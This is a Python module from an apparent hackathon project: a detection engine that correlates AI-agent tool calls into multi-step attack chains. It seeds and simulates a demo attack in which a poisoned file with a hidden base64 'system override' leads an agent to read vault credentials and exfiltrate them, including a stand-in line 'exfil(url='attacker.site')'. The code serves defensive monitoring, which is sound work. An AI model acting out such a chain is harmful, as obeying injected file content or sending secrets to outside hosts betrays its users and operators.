"""Multi-Tool Attack Chain Detection & Correlation Engine.

Correlates suspicious activities across multiple AI tool calls and sessions to
detect coordinated prompt-injection, multi-hop tool poisoning, and data-exfiltration
attacks that single-request analysis cannot identify.

Challenge Feature for Team Mutex (RH-0045) — RUSH HOUR Hackathon.
"""

from __future__ import annotations

import asyncio
import time
import uuid
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any

from app.schemas.events import GuardianEvent, ThreatCategory, Verdict


@dataclass
class AttackChainHop:
    step: int
    timestamp: str
    tool: str
    source: str
    target: str
    category: str
    verdict: str
    riskScore: float
    summary: str


@dataclass
class AttackChainNode:
    id: str
    label: str
    sub: str
    kind: str  # "user" | "agent" | "guardian" | "tool"
    risk: str  # "clean" | "warning" | "danger"


@dataclass
class AttackChainEdge:
    from_node: str
    to_node: str
    threat: bool
    label: str


@dataclass
class AttackChain:
    id: str
    title: str
    session_id: str
    pattern_type: str
    risk_score: float
    confidence: float
    status: str  # "active" | "contained" | "blocked"
    created_at: str
    updated_at: str
    hops: list[AttackChainHop] = field(default_factory=list)
    nodes: list[AttackChainNode] = field(default_factory=list)
    edges: list[AttackChainEdge] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "title": self.title,
            "sessionId": self.session_id,
            "patternType": self.pattern_type,
            "riskScore": self.risk_score,
            "confidence": self.confidence,
            "status": self.status,
            "createdAt": self.created_at,
            "updatedAt": self.updated_at,
            "hops": [
                {
                    "step": h.step,
                    "timestamp": h.timestamp,
                    "tool": h.tool,
                    "source": h.source,
                    "target": h.target,
                    "category": h.category,
                    "verdict": h.verdict,
                    "riskScore": h.riskScore,
                    "summary": h.summary,
                }
                for h in self.hops
            ],
            "nodes": [
                {"id": n.id, "label": n.label, "sub": n.sub, "kind": n.kind, "risk": n.risk}
                for n in self.nodes
            ],
            "edges": [
                {"from": e.from_node, "to": e.to_node, "threat": e.threat, "label": e.label}
                for e in self.edges
            ],
        }


class MultiToolAttackChainEngine:
    def __init__(self, window_seconds: float = 600.0) -> None:
        self.window_seconds = window_seconds
        # session_id -> list of (timestamp, GuardianEvent)
        self._session_history: dict[str, list[tuple[float, GuardianEvent]]] = defaultdict(list)
        # id -> AttackChain
        self._chains: dict[str, AttackChain] = {}
        # WS subscribers: set of asyncio.Queue — each connected /ws/chains client gets one
        self._subscribers: set[asyncio.Queue[dict[str, Any]]] = set()
        self._seed_demo_chain()

    # ── Demo seed ──────────────────────────────────────────────────────────

    def _seed_demo_chain(self) -> None:
        """Seed one realistic attack chain so the graph is populated on first open."""
        cid = "chain-rh-0045-demo"
        now = datetime.now(timezone.utc).isoformat()
        chain = AttackChain(
            id=cid,
            title="Multi-Tool Exfiltration Sequence (Poisoned File → Vault → Relay)",
            session_id="session-rh0045",
            pattern_type="INDIRECT_INJECTION_EXFILTRATION",
            risk_score=94.5,
            confidence=0.96,
            status="contained",
            created_at=now,
            updated_at=now,
            hops=[
                AttackChainHop(step=1, timestamp=now, tool="read_document",
                    source="research-agent", target="filesystem-mcp",
                    category="encoded_payload", verdict="QUARANTINE", riskScore=50.0,
                    summary="Poisoned vendor-config.txt with hidden base64 payload."),
                AttackChainHop(step=2, timestamp=now, tool="vault_read",
                    source="research-agent", target="vault-mcp",
                    category="prompt_injection", verdict="BLOCK", riskScore=92.9,
                    summary="Follow-up instruction attempted credential read from vault-mcp."),
                AttackChainHop(step=3, timestamp=now, tool="send_notification",
                    source="research-agent", target="webhook-gateway",
                    category="pii_leakage", verdict="BLOCK", riskScore=98.0,
                    summary="Exfiltration of recovered tokens out of trust boundary."),
            ],
            nodes=[
                AttackChainNode(id="u1",  label="User / Client",      sub="RH-0045 Session",         kind="user",     risk="warning"),
                AttackChainNode(id="a1",  label="research-agent",     sub="claude-3.5-sonnet",        kind="agent",    risk="danger"),
                AttackChainNode(id="g1",  label="Guardian Firewall",  sub="Multi-Tool Correlator",    kind="guardian", risk="clean"),
                AttackChainNode(id="t1",  label="filesystem-mcp",     sub="vendor-config.txt",        kind="tool",     risk="warning"),
                AttackChainNode(id="t2",  label="vault-mcp",          sub="API Secrets",              kind="tool",     risk="danger"),
                AttackChainNode(id="t3",  label="send_notification",  sub="Exfil Gateway",            kind="tool",     risk="danger"),
            ],
            edges=[
                AttackChainEdge(from_node="u1", to_node="a1", threat=False, label="prompt"),
                AttackChainEdge(from_node="a1", to_node="g1", threat=True,  label="tool call"),
                AttackChainEdge(from_node="g1", to_node="t1", threat=True,  label="Step 1: Poisoned Read"),
                AttackChainEdge(from_node="g1", to_node="t2", threat=True,  label="Step 2: Vault Access"),
                AttackChainEdge(from_node="g1", to_node="t3", threat=True,  label="Step 3: Exfil Relay"),
            ],
        )
        self._chains[cid] = chain

    # ── WS pub/sub ─────────────────────────────────────────────────────────

    def subscribe(self) -> asyncio.Queue[dict[str, Any]]:
        q: asyncio.Queue[dict[str, Any]] = asyncio.Queue(maxsize=64)
        self._subscribers.add(q)
        return q

    def unsubscribe(self, q: asyncio.Queue[dict[str, Any]]) -> None:
        self._subscribers.discard(q)

    async def _publish(self, chain: AttackChain) -> None:
        payload = chain.to_dict()
        for q in list(self._subscribers):
            try:
                q.put_nowait(payload)
            except asyncio.QueueFull:
                pass  # slow consumer — drop rather than block

    # ── Core correlation ───────────────────────────────────────────────────

    async def ingest_event(self, event: GuardianEvent) -> AttackChain | None:
        """Ingest an event; return a new AttackChain if a pattern is confirmed."""
        now = time.time()
        key = event.source or "session-default"
        self._session_history[key].append((now, event))

        # Evict events outside the correlation window.
        cutoff = now - self.window_seconds
        self._session_history[key] = [
            (t, e) for t, e in self._session_history[key] if t >= cutoff
        ]

        recent = [e for _, e in self._session_history[key]]
        chain = self._evaluate(key, recent)
        if chain is not None:
            await self._publish(chain)
        return chain

    def _evaluate(self, session_key: str, events: list[GuardianEvent]) -> AttackChain | None:
        if len(events) < 2:
            return None

        non_benign = [e for e in events if e.category != ThreatCategory.BENIGN]
        tools_involved = {e.tool for e in non_benign if e.tool}

        # Require at least 2 distinct tool calls with non-benign verdicts.
        if len(non_benign) < 2 or len(tools_involved) < 2:
            return None

        chain_id = f"chain-{uuid.uuid4().hex[:8]}"
        now_iso = datetime.now(timezone.utc).isoformat()
        max_risk = max(e.riskScore for e in non_benign)

        hops = [
            AttackChainHop(
                step=i + 1,
                timestamp=e.timestamp,
                tool=e.tool or "unknown",
                source=e.source,
                target=e.target,
                category=e.category.value,
                verdict=e.verdict.value,
                riskScore=e.riskScore,
                summary=e.explanation[:120],
            )
            for i, e in enumerate(non_benign)
        ]

        nodes: list[AttackChainNode] = [
            AttackChainNode(id="user-node",     label="Session Client",    sub=session_key,         kind="user",     risk="warning"),
            AttackChainNode(id="agent-node",    label=events[0].source,    sub="AI Agent",           kind="agent",    risk="danger"),
            AttackChainNode(id="guardian-node", label="Guardian Firewall", sub="Chain Correlator",   kind="guardian", risk="clean"),
        ]
        edges: list[AttackChainEdge] = [
            AttackChainEdge(from_node="user-node",  to_node="agent-node",    threat=False, label="session"),
            AttackChainEdge(from_node="agent-node", to_node="guardian-node", threat=True,  label="multi-tool sequence"),
        ]

        for i, e in enumerate(non_benign):
            tid = f"tool-{i}-{e.tool or 'mcp'}"
            nodes.append(AttackChainNode(
                id=tid,
                label=e.tool or "mcp-server",
                sub=f"Step {i + 1}: {e.category.value}",
                kind="tool",
                risk="danger" if e.verdict == Verdict.BLOCK else "warning",
            ))
            edges.append(AttackChainEdge(
                from_node="guardian-node",
                to_node=tid,
                threat=True,
                label=f"Step {i + 1}: {e.verdict.value}",
            ))

        is_contained = any(e.verdict in (Verdict.BLOCK, Verdict.QUARANTINE) for e in non_benign)
        chain = AttackChain(
            id=chain_id,
            title=f"Multi-Tool Attack Chain ({' → '.join(sorted(tools_involved))})",
            session_id=session_key,
            pattern_type="MULTI_TOOL_CORRELATED_ATTACK",
            risk_score=min(100.0, max_risk + 5.0),
            confidence=0.92,
            status="contained" if is_contained else "active",
            created_at=now_iso,
            updated_at=now_iso,
            hops=hops,
            nodes=nodes,
            edges=edges,
        )
        self._chains[chain_id] = chain
        return chain

    # ── Demo simulation ────────────────────────────────────────────────────

    def trigger_demo_simulation(self) -> tuple[AttackChain, list[GuardianEvent]]:
        """Simulate a 3-hop attack chain for judge demonstration."""
        now_iso = datetime.now(timezone.utc).isoformat()

        def _evt(tool: str, target: str, category: ThreatCategory, verdict: Verdict,
                 risk: float, sev: str, explanation: str, preview: str) -> GuardianEvent:
            return GuardianEvent(
                id=uuid.uuid4().hex[:10],
                timestamp=now_iso,
                direction="outbound",
                source="research-agent",
                target=target,
                tool=tool,
                riskScore=risk,
                category=category,
                verdict=verdict,
                severity=sev,  # type: ignore[arg-type]
                explanation=explanation,
                recommendedAction="Block execution and broadcast multi-tool alert.",
                signals=[],
                latencyMs=0.2,
                preview=preview,
            )

        e1 = _evt("read_document",     "filesystem-mcp",    ThreatCategory.ENCODED_PAYLOAD,  Verdict.QUARANTINE, 50.0,  "high",     "read_document returned base64-obfuscated payload with system override.", "<hidden base64>")
        e2 = _evt("vault_read",        "vault-mcp",         ThreatCategory.PROMPT_INJECTION,  Verdict.BLOCK,      92.9,  "critical", "Follow-up attempted credential read from vault-mcp.",                   "vault.get('DB_URL')")
        e3 = _evt("send_notification", "webhook-gateway",   ThreatCategory.PII_LEAKAGE,       Verdict.BLOCK,      98.0,  "critical", "Final stage relayed credentials to external webhook.",                   "exfil(url='attacker.site')")

        sim_id = f"chain-sim-{uuid.uuid4().hex[:6]}"
        chain = AttackChain(
            id=sim_id,
            title="Live Demo: Poisoned Read → Vault Access → Exfil Relay",
            session_id="session-judge-demo",
            pattern_type="MULTI_TOOL_INDIRECT_INJECTION_EXFIL",
            risk_score=98.0,
            confidence=0.98,
            status="contained",
            created_at=now_iso,
            updated_at=now_iso,
            hops=[
                AttackChainHop(step=1, timestamp=now_iso, tool="read_document",     source="research-agent", target="filesystem-mcp",   category="encoded_payload",  verdict="QUARANTINE", riskScore=50.0, summary="Poisoned file read"),
                AttackChainHop(step=2, timestamp=now_iso, tool="vault_read",        source="research-agent", target="vault-mcp",         category="prompt_injection", verdict="BLOCK",      riskScore=92.9, summary="Vault credential read"),
                AttackChainHop(step=3, timestamp=now_iso, tool="send_notification", source="research-agent", target="webhook-gateway",   category="pii_leakage",      verdict="BLOCK",      riskScore=98.0, summary="Webhook exfiltration"),
            ],
            nodes=[
                AttackChainNode(id="sim-u1", label="Judge Demo Session", sub="RH-0045",           kind="user",     risk="warning"),
                AttackChainNode(id="sim-a1", label="research-agent",     sub="claude-3.5-sonnet", kind="agent",    risk="danger"),
                AttackChainNode(id="sim-g1", label="Guardian Firewall",  sub="Correlator Engine", kind="guardian", risk="clean"),
                AttackChainNode(id="sim-t1", label="filesystem-mcp",     sub="read_document",     kind="tool",     risk="warning"),
                AttackChainNode(id="sim-t2", label="vault-mcp",          sub="vault_read",        kind="tool",     risk="danger"),
                AttackChainNode(id="sim-t3", label="webhook-gateway",    sub="send_notification", kind="tool",     risk="danger"),
            ],
            edges=[
                AttackChainEdge(from_node="sim-u1", to_node="sim-a1", threat=False, label="user prompt"),
                AttackChainEdge(from_node="sim-a1", to_node="sim-g1", threat=True,  label="tool sequence"),
                AttackChainEdge(from_node="sim-g1", to_node="sim-t1", threat=True,  label="Step 1: Read Poisoned Doc"),
                AttackChainEdge(from_node="sim-g1", to_node="sim-t2", threat=True,  label="Step 2: Read Vault Creds"),
                AttackChainEdge(from_node="sim-g1", to_node="sim-t3", threat=True,  label="Step 3: Exfil Webhook"),
            ],
        )
        self._chains[sim_id] = chain
        return chain, [e1, e2, e3]

    # ── Query ──────────────────────────────────────────────────────────────

    def get_all_chains(self) -> list[dict[str, Any]]:
        return [
            c.to_dict()
            for c in sorted(self._chains.values(), key=lambda x: x.updated_at, reverse=True)
        ]

    def get_chain(self, chain_id: str) -> dict[str, Any] | None:
        c = self._chains.get(chain_id)
        return c.to_dict() if c else None


# Module-level singleton
correlator = MultiToolAttackChainEngine()
